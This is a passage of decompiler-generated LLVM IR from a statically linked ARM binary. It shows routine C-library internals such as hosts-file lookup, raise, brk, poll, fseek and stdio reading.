  br i1 %v2_15d1c, label %dec_label_pc_15d20, label %dec_label_pc_15d2c

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d08
  %v2_15d20 = load i32, i32* @global_var_29e6c.721, align 4
  store i32 %v2_15d20, i32* @r4, align 4
  %v7_15d28 = icmp slt i32 %v2_15d20, 3
  br i1 %v7_15d28, label %dec_label_pc_15cf0, label %dec_label_pc_15d2c

dec_label_pc_15d2c:                               ; preds = %dec_label_pc_15d08, %dec_label_pc_15d20, %dec_label_pc_15cd0
  %v0_15d2c = load i32, i32* @r6, align 4
  store i32 %v0_15d2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b088.902 to i32), i32* @r1, align 4
  %v3_15d34 = inttoptr i32 %v0_15d2c to i8*
  %v4_15d34 = call i32 @__GI_strcoll(i8* %v3_15d34, i32 ptrtoint ([7 x i8]* @global_var_1b088.902 to i32))
  store i32 %v4_15d34, i32* %r0.global-to-local, align 4
  %v2_15d38 = icmp eq i32 %v4_15d34, 0
  br i1 %v2_15d38, label %dec_label_pc_15d70.preheader, label %dec_label_pc_15d40

dec_label_pc_15d40:                               ; preds = %dec_label_pc_15d2c
  %v0_15d40 = load i32, i32* @r6, align 4
  store i32 %v0_15d40, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b090.904 to i32), i32* @r1, align 4
  %v3_15d48 = inttoptr i32 %v0_15d40 to i8*
  %v4_15d48 = call i32 @__GI_strcoll(i8* %v3_15d48, i32 ptrtoint ([7 x i8]* @global_var_1b090.904 to i32))
  store i32 %v4_15d48, i32* %r0.global-to-local, align 4
  %v2_15d4c = icmp eq i32 %v4_15d48, 0
  br i1 %v2_15d4c, label %dec_label_pc_15d70.preheader, label %dec_label_pc_15dcc.backedge

dec_label_pc_15d70.preheader:                     ; preds = %dec_label_pc_15d2c, %dec_label_pc_15d40
  store i32 ptrtoint (i32* @global_var_29e70.879 to i32), i32* @r4, align 4
  %v2_15d7460 = load i32, i32* @global_var_29e70.879, align 4
  store i32 ptrtoint (i32* @global_var_29e50.883 to i32), i32* @r5, align 4
  %v1_15d8063 = add i32 %v2_15d7460, -1
  store i32 %v1_15d8063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_15d7460, 1
  br i1 %tmp5964, label %dec_label_pc_15d88, label %dec_label_pc_15d58

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d70.preheader, %dec_label_pc_15d58
  %v1_15d8065 = phi i32 [ %v1_15d80, %dec_label_pc_15d58 ], [ %v1_15d8063, %dec_label_pc_15d70.preheader ]
  %v4_15d58 = mul i32 %v1_15d8065, 4
  %v5_15d58 = add i32 %v4_15d58, ptrtoint (i32* @global_var_29e50.883 to i32)
  %v6_15d58 = inttoptr i32 %v5_15d58 to i32*
  %v7_15d58 = load i32, i32* %v6_15d58, align 4
  store i32 %v7_15d58, i32* @r0, align 4
  store i32 %v1_15d8065, i32* @global_var_29e70.879, align 4
  %v0_15d60 = call i32 @free()
  store i32 %v0_15d60, i32* %r0.global-to-local, align 4
  %v0_15d64 = load i32, i32* @r4, align 4
  %v1_15d64 = inttoptr i32 %v0_15d64 to i32*
  %v2_15d64 = load i32, i32* %v1_15d64, align 4
  %v1_15d6c = load i32, i32* @r5, align 4
  %v5_15d6c = mul i32 %v2_15d64, 4
  %v6_15d6c = add i32 %v1_15d6c, %v5_15d6c
  %v7_15d6c = inttoptr i32 %v6_15d6c to i32*
  store i32 0, i32* %v7_15d6c, align 4
  store i32 ptrtoint (i32* @global_var_29e70.879 to i32), i32* @r4, align 4
  %v2_15d74 = load i32, i32* @global_var_29e70.879, align 4
  store i32 ptrtoint (i32* @global_var_29e50.883 to i32), i32* @r5, align 4
  %v1_15d80 = add i32 %v2_15d74, -1
  store i32 %v1_15d80, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_15d74, 1
  br i1 %tmp59, label %dec_label_pc_15d88, label %dec_label_pc_15d58

dec_label_pc_15d88:                               ; preds = %dec_label_pc_15d58, %dec_label_pc_15d70.preheader
  br label %dec_label_pc_15da8

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15dc0
  %v1_15d90 = add i32 %v5_15db0, -36
  %v2_15d90 = inttoptr i32 %v1_15d90 to i32*
  %v3_15d90 = load i32, i32* %v2_15d90, align 4
  store i32 %v3_15d90, i32* %r0.global-to-local, align 4
  %v1_15d94 = inttoptr i32 %v3_15d90 to i8*
  %v2_15d94 = call i32 @__GI_strdup(i8* %v1_15d94)
  store i32 %v2_15d94, i32* %r0.global-to-local, align 4
  %v0_15d9c = load i32, i32* @r4, align 4
  %v1_15d9c = add i32 %v0_15d9c, 1
  store i32 %v1_15d9c, i32* %r2.global-to-local, align 4
  %v5_15da0 = mul i32 %v0_15d9c, 4
  %v6_15da0 = add i32 %v5_15da0, ptrtoint (i32* @global_var_29e50.883 to i32)
  %v7_15da0 = inttoptr i32 %v6_15da0 to i32*
  store i32 %v2_15d94, i32* %v7_15da0, align 4
  %v0_15da4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15da4 = load i32, i32* @r6, align 4
  %v2_15da4 = inttoptr i32 %v1_15da4 to i32*
  store i32 %v0_15da4, i32* %v2_15da4, align 4
  %v0_15dac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15da8

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15d88, %dec_label_pc_15d90
  %v0_15db8 = phi i32 [ 1, %dec_label_pc_15d88 ], [ %v0_15dac.pre, %dec_label_pc_15d90 ]
  store i32 %v2_15c40, i32* %r2.global-to-local, align 4
  %v1_15dac = load i32, i32* @r8, align 4
  %v2_15dac = sub i32 %v0_15db8, %v1_15dac
  %v4_15dac = xor i32 %v1_15dac, %v0_15db8
  %v5_15dac = xor i32 %v2_15dac, %v0_15db8
  %v6_15dac = and i32 %v5_15dac, %v4_15dac
  %v7_15dac = icmp slt i32 %v6_15dac, 0
  %v8_15dac = icmp slt i32 %v2_15dac, 0
  %v4_15db0 = mul i32 %v0_15db8, 4
  %v5_15db0 = add i32 %v4_15db0, %v2_15c40
  store i32 ptrtoint (i32* @global_var_29e70.879 to i32), i32* @r6, align 4
  %v1_15db8 = add i32 %v0_15db8, 1
  store i32 %v1_15db8, i32* @r5, align 4
  %v2_15dbc = xor i1 %v8_15dac, %v7_15dac
  br i1 %v2_15dbc, label %dec_label_pc_15dc0, label %dec_label_pc_15dcc.backedge

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15da8
  %v2_15dc0 = load i32, i32* @global_var_29e70.879, align 4
  store i32 %v2_15dc0, i32* @r4, align 4
  %v7_15dc8 = icmp slt i32 %v2_15dc0, 4
  br i1 %v7_15dc8, label %dec_label_pc_15d90, label %dec_label_pc_15dcc.backedge

dec_label_pc_15bfc.preheader:                     ; preds = %dec_label_pc_15bfc.preheader.lr.ph, %dec_label_pc_15dcc.backedge
  store i32 %v2_15b90, i32* %r0.global-to-local, align 4
  %v2_15bfc12 = load i8, i8* %v1_15bfc11, align 4
  %v3_15bfc13 = zext i8 %v2_15bfc12 to i32
  store i32 %v3_15bfc13, i32* %r2.global-to-local, align 4
  %v2_15c0014 = icmp eq i8 %v2_15bfc12, 0
  br i1 %v2_15c0014, label %dec_label_pc_15c1c, label %dec_label_pc_15c08.lr.ph

dec_label_pc_15c08.lr.ph:                         ; preds = %dec_label_pc_15bfc.preheader
  %v2_15c0c.pre = load i32, i32* @global_var_237ac, align 4
  br label %dec_label_pc_15c08

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15dcc.backedge, %dec_label_pc_15dcc.preheader
  %v0_15dec = load i32, i32* @sl, align 4
  store i32 %v0_15dec, i32* %r0.global-to-local, align 4
  %v1_15df0 = inttoptr i32 %v0_15dec to i8*
  %v2_15df0 = call i32 @__GI_fclose(i8* %v1_15df0)
  store i32 %v2_15df0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15be0
  %v0_15df8 = call i32 @__GI___h_errno_location()
  store i32 %v0_15df8, i32* %r0.global-to-local, align 4
  %v2_15e00 = inttoptr i32 %v0_15df8 to i32*
  store i32 3, i32* %v2_15e00, align 4
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %entry, %dec_label_pc_15dec, %dec_label_pc_15df8
  store i32 %v2_15b94, i32* @r0, align 4
  %v1_15e14 = call i32 @__pthread_return_void()
  store i32 %v1_15e14, i32* %r0.global-to-local, align 4
  store i32 %v6_15b8c, i32* @r5, align 4
  store i32 %v9_15b8c, i32* @r6, align 4
  store i32 %v12_15b8c, i32* @r7, align 4
  store i32 %v15_15b8c, i32* @r8, align 4
  store i32 %v18_15b8c, i32* @sl, align 4
  ret i32 %v1_15e14

; uselistorder directives
  uselistorder i32 %v3_15bfc13, { 2, 1, 0 }
  uselistorder i32 %v2_15dac, { 1, 0 }
  uselistorder i32 %v0_15db8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_15d80, { 1, 0 }
  uselistorder i32 %v1_15d8065, { 1, 0 }
  uselistorder i32 %v2_15d0c, { 1, 0 }
  uselistorder i32 %v0_15d18, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15c48, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_15c8820, { 1, 0, 2 }
  uselistorder i32 %v2_15c40, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_15b90, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 4, 2, 3, 5, 15, 8, 6, 7, 9, 1, 10, 17, 11, 13, 12, 16, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 19, 5, 4, 6, 8, 7, 10, 9, 12, 11, 20, 13, 14, 18, 15, 17, 22, 21, 16, 28, 27, 23, 26, 24, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_29e50.883 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_29e70.879, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_29e70.879 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_29e60.724 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 6, 3, 4, 8, 9, 10, 11, 7, 12, 5, 13 }
  uselistorder i32* @global_var_29e6c.721, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_15e04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15bfc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15da8, { 1, 0 }
  uselistorder label %dec_label_pc_15d58, { 1, 0 }
  uselistorder label %dec_label_pc_15d70.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d08, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_15cb4, { 1, 0 }
  uselistorder label %dec_label_pc_15cb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c94, { 1, 0 }
  uselistorder label %dec_label_pc_15c80, { 1, 0 }
  uselistorder label %dec_label_pc_15c60, { 1, 0 }
  uselistorder label %dec_label_pc_15dcc.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_15c1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15dcc.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_15e9c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_15e9c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15ea8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15eb0 = call i32 @__libc_getpid()
  store i32 %v3_15ea8, i32* @r4, align 4
  %v0_15ebc = call i32 @kill()
  ret i32 %v0_15ebc

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15ec0 = add i32 %arg1, 28
  %v2_15ec0 = inttoptr i32 %v1_15ec0 to i32*
  %v3_15ec0 = load i32, i32* %v2_15ec0, align 4
  %v1_15ec8 = add i32 %arg1, 44
  %v2_15ec8 = inttoptr i32 %v1_15ec8 to i32*
  %v3_15ec8 = load i32, i32* %v2_15ec8, align 4
  store i32 %v3_15ec0, i32* @global_var_29e74.909, align 4
  store i32 %v3_15ec8, i32* @global_var_29e78.911, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15eec = call i32 @brk(i32* %arg1)
  %v3_15ef0 = icmp ult i32 %v2_15eec, %tmp
  store i32 %v2_15eec, i32* @global_var_29da4.846, align 4
  br i1 %v3_15ef0, label %dec_label_pc_15f04, label %dec_label_pc_15f14

dec_label_pc_15f04:                               ; preds = %entry
  %v0_15f04 = call i32 @__errno_location()
  %v2_15f0c = inttoptr i32 %v0_15f04 to i32*
  store i32 12, i32* %v2_15f0c, align 4
  br label %dec_label_pc_15f14

dec_label_pc_15f14:                               ; preds = %entry, %dec_label_pc_15f04
  %v0_15f14 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_15f04 ]
  ret i32 %v0_15f14

; uselistorder directives
  uselistorder i32* @global_var_29da4.846, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15f14, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15f20 = load i32, i32* @r4, align 4
  store i32 %v3_15f20, i32* %stack_var_-8, align 4
  %v5_15f24 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_15f24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15f24, -4095
  br i1 %tmp, label %dec_label_pc_15f44, label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %entry
  %v0_15f34 = call i32 @__errno_location()
  %v0_15f38 = load i32, i32* %r4.global-to-local, align 4
  %v1_15f38 = sub i32 0, %v0_15f38
  %v2_15f3c = inttoptr i32 %v0_15f34 to i32*
  store i32 %v1_15f38, i32* %v2_15f3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f44

dec_label_pc_15f44:                               ; preds = %entry, %dec_label_pc_15f34
  %v0_15f44 = phi i32 [ %v5_15f24, %entry ], [ -1, %dec_label_pc_15f34 ]
  %v2_15f48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15f48, i32* @r4, align 4
  ret i32 %v0_15f44

; uselistorder directives
  uselistorder i32 %v5_15f24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15f44, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_15f4c = load i32, i32* @r2, align 4
  store i32 %v0_15f4c, i32* @r3, align 4
  %v0_15f54 = call i32 @__GI_fseeko64()
  ret i32 %v0_15f54
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_15f58 = load i32, i32* @r4, align 4
  %v6_15f58 = load i32, i32* @r5, align 4
  %v9_15f58 = load i32, i32* @r6, align 4
  %v0_15f5c = load i32, i32* @r3, align 4
  %v2_15f60 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_15f5c, i32* @r6, align 4
  %v0_15f68 = load i32, i32* @r0, align 4
  store i32 %v0_15f68, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_15f5c, 3
  br i1 %tmp, label %dec_label_pc_15f84, label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %entry
  %v0_15f70 = call i32 @__errno_location()
  store i32 %v0_15f70, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_15f7c = inttoptr i32 %v0_15f70 to i32*
  store i32 22, i32* %v2_15f7c, align 4
  br label %.thread3

dec_label_pc_15f84:                               ; preds = %entry
  %v1_15f84 = add i32 %v0_15f68, 52
  %v2_15f84 = inttoptr i32 %v1_15f84 to i32*
  %v3_15f84 = load i32, i32* %v2_15f84, align 4
  store i32 %v3_15f84, i32* %r7.global-to-local, align 4
  %v2_15f88 = icmp eq i32 %v3_15f84, 0
  %v0_15f8c = load i32, i32* @r1, align 4
  store i32 %v0_15f8c, i32* %stack_var_-28, align 4
  br i1 %v2_15f88, label %dec_label_pc_15f98, label %dec_label_pc_15fc4

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f84
  %v1_15f98 = add i32 %v0_15f68, 56
  store i32 %v1_15f98, i32* @r4, align 4
  store i32 79836, i32* %r3.global-to-local, align 4
  store i32 %v2_15f60, i32* @r0, align 4
  store i32 %v1_15f98, i32* %r2.global-to-local, align 4
  %v1_15fb0 = call i32 @__pthread_return_void()
  %v0_15fb4 = load i32, i32* @r4, align 4
  store i32 %v0_15fb4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r3.global-to-local, align 4
  store i32 90052, i32* @lr, align 4
  %v1_15fc0 = call i32 @__pthread_return_0()
  store i32 %v1_15fc0, i32* %r0.global-to-local, align 4
  %v0_15fc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15fc4

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_15f84, %dec_label_pc_15f98
  %v0_15fd0 = phi i32 [ %v0_15f68, %dec_label_pc_15f84 ], [ %v0_15fc4.pre, %dec_label_pc_15f98 ]
  %v1_15fc4 = inttoptr i32 %v0_15fd0 to i8*
  %v2_15fc4 = load i8, i8* %v1_15fc4, align 1
  %v3_15fc4 = zext i8 %v2_15fc4 to i32
  store i32 %v3_15fc4, i32* %r3.global-to-local, align 4
  %v1_15fc8 = and i32 %v3_15fc4, 64
  %v2_15fc8 = icmp eq i32 %v1_15fc8, 0
  br i1 %v2_15fc8, label %dec_label_pc_15fe0, label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fc4
  store i32 %v0_15fd0, i32* @r0, align 4
  %v0_15fd4 = call i32 @__stdio_wcommit()
  store i32 %v0_15fd4, i32* %r0.global-to-local, align 4
  %v2_15fd8 = icmp eq i32 %v0_15fd4, 0
  br i1 %v2_15fd8, label %dec_label_pc_15fe0, label %dec_label_pc_16050

dec_label_pc_15fe0:                               ; preds = %dec_label_pc_15fd0, %dec_label_pc_15fc4
  %v0_15fe0 = load i32, i32* @r6, align 4
  %v7_15fe0 = icmp eq i32 %v0_15fe0, 1
  br i1 %v7_15fe0, label %dec_label_pc_15fe8, label %dec_label_pc_15fe0.dec_label_pc_15ffc_crit_edge

dec_label_pc_15fe0.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15fe0
  br label %dec_label_pc_15ffc

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fe0
  %v0_15fe8 = load i32, i32* @r5, align 4
  store i32 %v0_15fe8, i32* %r0.global-to-local, align 4
  %v2_15fec = ptrtoint i32* %stack_var_-28 to i32
  %v2_15ff0 = inttoptr i32 %v0_15fe8 to i8*
  %v3_15ff0 = call i32 @__stdio_adjust_position(i8* %v2_15ff0, i32 %v2_15fec)
  store i32 %v3_15ff0, i32* %r0.global-to-local, align 4
  %v1_15ff4 = icmp slt i32 %v3_15ff0, 0
  br i1 %v1_15ff4, label %dec_label_pc_16050, label %dec_label_pc_15fe8.dec_label_pc_15ffc_crit_edge

dec_label_pc_15fe8.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15fe8
  %v0_15ffc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fe0.dec_label_pc_15ffc_crit_edge, %dec_label_pc_15fe8.dec_label_pc_15ffc_crit_edge
  %v0_15ffc = phi i32 [ %v0_15fe0, %dec_label_pc_15fe0.dec_label_pc_15ffc_crit_edge ], [ %v0_15ffc.pre, %dec_label_pc_15fe8.dec_label_pc_15ffc_crit_edge ]
  store i32 %v0_15ffc, i32* %r2.global-to-local, align 4
  %v0_16000 = load i32, i32* @r5, align 4
  store i32 %v0_16000, i32* %r0.global-to-local, align 4
  %v4_16008 = call i32 @__stdio_seek(i32 %v0_16000, i32* nonnull %stack_var_-28, i32 %v0_15ffc)
  store i32 %v4_16008, i32* %r0.global-to-local, align 4
  %v1_1600c = icmp slt i32 %v4_16008, 0
  br i1 %v1_1600c, label %dec_label_pc_16050, label %dec_label_pc_16014

dec_label_pc_16014:                               ; preds = %dec_label_pc_15ffc
  %v0_16014 = load i32, i32* @r5, align 4
  %v1_16014 = inttoptr i32 %v0_16014 to i32*
  %v2_16014 = load i32, i32* %v1_16014, align 4
  store i32 %v2_16014, i32* %r3.global-to-local, align 4
  %v1_16018 = add i32 %v0_16014, 8
  %v2_16018 = inttoptr i32 %v1_16018 to i32*
  %v3_16018 = load i32, i32* %v2_16018, align 4
  store i32 %v3_16018, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16020 = and i32 %v2_16014, -72
  store i32 %v1_16020, i32* %r3.global-to-local, align 4
  %v3_16024 = sdiv i32 %v2_16014, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1602c = trunc i32 %v3_16024 to i8
  %v3_1602c = add i32 %v0_16014, 1
  %v4_1602c = inttoptr i32 %v3_1602c to i8*
  store i8 %v1_1602c, i8* %v4_1602c, align 1
  %v0_16030 = load i32, i32* %r2.global-to-local, align 4
  %v1_16030 = load i32, i32* @r5, align 4
  %v2_16030 = add i32 %v1_16030, 28
  %v3_16030 = inttoptr i32 %v2_16030 to i32*
  store i32 %v0_16030, i32* %v3_16030, align 4
  %v0_16034 = load i32, i32* %r0.global-to-local, align 4
  %v1_16034 = trunc i32 %v0_16034 to i8
  %v2_16034 = load i32, i32* @r5, align 4
  %v3_16034 = add i32 %v2_16034, 2
  %v4_16034 = inttoptr i32 %v3_16034 to i8*
  store i8 %v1_16034, i8* %v4_16034, align 1
  %v0_16038 = load i32, i32* %r3.global-to-local, align 4
  %v1_16038 = trunc i32 %v0_16038 to i8
  %v2_16038 = load i32, i32* @r5, align 4
  %v3_16038 = inttoptr i32 %v2_16038 to i8*
  store i8 %v1_16038, i8* %v3_16038, align 1
  %v0_1603c = load i32, i32* %r2.global-to-local, align 4
  %v1_1603c = load i32, i32* @r5, align 4
  %v2_1603c = add i32 %v1_1603c, 16
  %v3_1603c = inttoptr i32 %v2_1603c to i32*
  store i32 %v0_1603c, i32* %v3_1603c, align 4
  %v0_16040 = load i32, i32* %r2.global-to-local, align 4
  %v1_16040 = load i32, i32* @r5, align 4
  %v2_16040 = add i32 %v1_16040, 20
  %v3_16040 = inttoptr i32 %v2_16040 to i32*
  store i32 %v0_16040, i32* %v3_16040, align 4
  %v0_16044 = load i32, i32* %r2.global-to-local, align 4
  %v1_16044 = load i32, i32* @r5, align 4
  %v2_16044 = add i32 %v1_16044, 24
  %v3_16044 = inttoptr i32 %v2_16044 to i32*
  store i32 %v0_16044, i32* %v3_16044, align 4
  %v0_16048 = load i32, i32* %r0.global-to-local, align 4
  %v1_16048 = load i32, i32* @r5, align 4
  %v2_16048 = add i32 %v1_16048, 44
  %v3_16048 = inttoptr i32 %v2_16048 to i32*
  store i32 %v0_16048, i32* %v3_16048, align 4
  br label %dec_label_pc_16054

dec_label_pc_16050:                               ; preds = %dec_label_pc_15fd0, %dec_label_pc_15ffc, %dec_label_pc_15fe8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16054

dec_label_pc_16054:                               ; preds = %dec_label_pc_16014, %dec_label_pc_16050
  %v0_16054 = load i32, i32* %r7.global-to-local, align 4
  %v2_16054 = icmp eq i32 %v0_16054, 0
  br i1 %v2_16054, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16054
  store i32 %v2_15f60, i32* %r0.global-to-local, align 4
  store i32 79836, i32* %r3.global-to-local, align 4
  store i32 90220, i32* @lr, align 4
  call void @__pseudo_branch(i32 79836)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16054, %dec_label_pc_15f70, %bb
  %v0_1606c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1606c, i32* %r0.global-to-local, align 4
  store i32 %v3_15f58, i32* @r4, align 4
  store i32 %v6_15f58, i32* @r5, align 4
  store i32 %v9_15f58, i32* @r6, align 4
  ret i32 %v0_1606c

; uselistorder directives
  uselistorder i32 %v0_15ffc, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 8, 7, 11, 9, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 27, 26, 25, 24, 23, 22, 21, 4, 35, 45, 44, 19, 3, 2, 1, 42, 41, 40, 39, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 20, 18, 17, 16, 31, 30, 38, 15, 37, 43, 29, 28, 34, 33, 32 }
  uselistorder i32 ptrtoint (i8* @global_var_137d4.591 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 42, 39, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0, 41, 40, 48, 47, 46, 45, 10, 9, 12, 11, 7, 6, 5, 4, 3, 32, 31, 30, 8, 44, 2, 43, 29, 28, 27, 26, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 79836, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 52, { 3, 1, 5, 2, 0, 6, 4 }
  uselistorder i32 22, { 3, 12, 4, 11, 5, 6, 7, 16, 13, 8, 14, 0, 15, 9, 10, 1, 2 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16054, { 1, 0 }
  uselistorder label %dec_label_pc_16050, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15ffc, { 1, 0 }
  uselistorder label %dec_label_pc_15fc4, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16088 = load i32, i32* @r4, align 4
  store i32 %v3_16088, i32* %stack_var_-12, align 4
  %v3_1608c = load i8, i8* %arg1, align 1
  %v4_1608c = zext i8 %v3_1608c to i32
  store i32 %v4_1608c, i32* %r3.global-to-local, align 4
  %v1_16090 = and i32 %v4_1608c, 4
  store i32 %v1_16090, i32* %r5.global-to-local, align 4
  %v2_16090 = icmp eq i32 %v1_16090, 0
  store i1 %v2_16090, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_16090, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_16088, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_160a0 = icmp slt i32 %arg2, 0
  %v2_160a0 = icmp eq i32 %arg2, 0
  store i1 %v2_160a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_160a0, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_160a8 = add i32 %tmp, 4
  %v2_160a8 = inttoptr i32 %v1_160a8 to i32*
  %v3_160a8 = load i32, i32* %v2_160a8, align 4
  store i32 %v3_160a8, i32* %r0.global-to-local, align 4
  %v1_160ac = call i32 @__libc_read(i32 %v3_160a8)
  store i32 %v1_160ac, i32* %r0.global-to-local, align 4
  %v2_160b0 = icmp eq i32 %v1_160ac, 0
  store i1 %v2_160b0, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_160ac, 1
  br i1 %tmp11, label %bb13, label %bb12

